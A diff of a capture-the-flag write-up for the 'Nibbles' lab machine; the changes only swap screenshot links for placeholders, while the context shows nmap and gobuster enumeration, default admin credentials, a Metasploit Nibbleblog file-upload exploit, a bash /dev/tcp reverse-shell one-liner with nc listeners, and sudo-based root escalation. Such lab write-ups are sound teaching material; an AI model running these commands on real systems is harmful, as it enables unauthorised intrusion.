@@ -17,9 +17,9 @@ export target=10.129.13.133
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="450" height="60" alt="image" src="https://github.com/user-attachments/assets/c3aaabe3-5f63-492e-8f02-fbf9a20fd7ee" />
+<img width="450" height="60" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="718" height="215" alt="image" src="https://github.com/user-attachments/assets/1e858ce5-f24b-494d-bc04-72ae870f8768" />
+<img width="718" height="215" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Results:**
 - **Port 22**: SSH service
@@ -33,7 +33,7 @@ Performed detailed service enumeration on discovered ports:
 sudo nmap -sC -sV -p 22,80 -T4 $target
 ```
 
-<img width="764" height="382" alt="image" src="https://github.com/user-attachments/assets/e1df0e90-7865-4d1c-a49c-05d7aa958c9f" />
+<img width="764" height="382" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Findings:**
 - **Port 22**: OpenSSH service
@@ -45,13 +45,13 @@ sudo nmap -sC -sV -p 22,80 -T4 $target
 
 Visiting `http://10.129.13.133` revealed a basic webpage. Conducted directory brute-forcing:
 
-<img width="400" height="108" alt="image" src="https://github.com/user-attachments/assets/fd8fd1c6-e7bc-41ac-bd97-a28cc1bad5f7" />
+<img width="400" height="108" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ```bash
 gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 2>/dev/null
 ```
 
-<img width="959" height="416" alt="image" src="https://github.com/user-attachments/assets/4132156a-abae-422e-bc3e-c25c6c4ea6cd" />
+<img width="959" height="416" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Discovered:**
 - `/nibbleblog/` - Nibbleblog installation directory
@@ -64,7 +64,7 @@ Further enumeration of the Nibbleblog directory:
 gobuster dir -u http://$target/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 2>/dev/null
 ```
 
-<img width="959" height="618" alt="image" src="https://github.com/user-attachments/assets/0027b603-b3a2-4371-b3ee-efc6a7592a70" />
+<img width="959" height="618" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 **Key Findings:**
 - `/admin/` - Admin directory
@@ -75,12 +75,12 @@ gobuster dir -u http://$target/nibbleblog/ -w /usr/share/wordlists/dirbuster/dir
 1. **Admin Portal Discovery**: Accessed `http://10.129.13.133/nibbleblog/admin.php`
 2. **Default Credentials**: Researched and found default credentials `admin:nibbles`
 
-<img width="607" height="515" alt="image" src="https://github.com/user-attachments/assets/fdeea909-029a-4455-b8a0-6657dedea5b7" />
+<img width="607" height="515" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 3. **Successful Login**: Gained access to Nibbleblog admin panel
 4. **Version Identification**: Navigated to `http://10.129.13.133/nibbleblog/admin.php?controller=settings&action=general` revealing Nibbleblog version 4.0.3
 
-<img width="402" height="137" alt="image" src="https://github.com/user-attachments/assets/ebd10b04-611d-42ca-bdd1-4983dc9221bb" />
+<img width="402" height="137" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 ### Vulnerability Research
 
@@ -88,7 +88,7 @@ gobuster dir -u http://$target/nibbleblog/ -w /usr/share/wordlists/dirbuster/dir
 searchsploit nibbleblog
 ```
 
-<img width="948" height="179" alt="image" src="https://github.com/user-attachments/assets/d7611508-c64a-407f-a37c-3f934da0bc04" />
+<img width="948" height="179" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Exploits Found:**
 - Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)
@@ -108,7 +108,7 @@ msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog/
 msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
 ```
 
-<img width="956" height="860" alt="image" src="https://github.com/user-attachments/assets/ed2ca12c-eb67-4981-9af7-7151c5c9dc3c" />
+<img width="956" height="860" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ### Establishing Reverse Shell
 
@@ -126,7 +126,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.106/9005 0>&1"
 nc -nlvp 9005
 ```
 
-<img width="898" height="643" alt="image" src="https://github.com/user-attachments/assets/78b63781-5f5d-485e-9737-5b6450ff39a3" />
+<img width="898" height="643" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 ### User Flag
 
@@ -149,7 +149,7 @@ User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 ```
 
-<img width="745" height="148" alt="image" src="https://github.com/user-attachments/assets/7c89bd01-d987-4085-8963-16790285dfa7" />
+<img width="745" height="148" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 ### Exploiting Sudo Misconfiguration
 
@@ -168,14 +168,14 @@ User nibbler may run the following commands on Nibbles:
    sudo /home/nibbler/personal/stuff/monitor.sh
    ```
 
-<img width="953" height="179" alt="image" src="https://github.com/user-attachments/assets/3d15248b-6e48-481d-b9c1-f3e34c07fa8b" />
+<img width="953" height="179" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **Root Shell Listener:**
 ```bash
 nc -nlvp 9006
 ```
 
-<img width="592" height="618" alt="image" src="https://github.com/user-attachments/assets/f3391ca0-a5b3-4a02-bafb-b765fc76d98e" />
+<img width="592" height="618" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 ### Root Flag
 
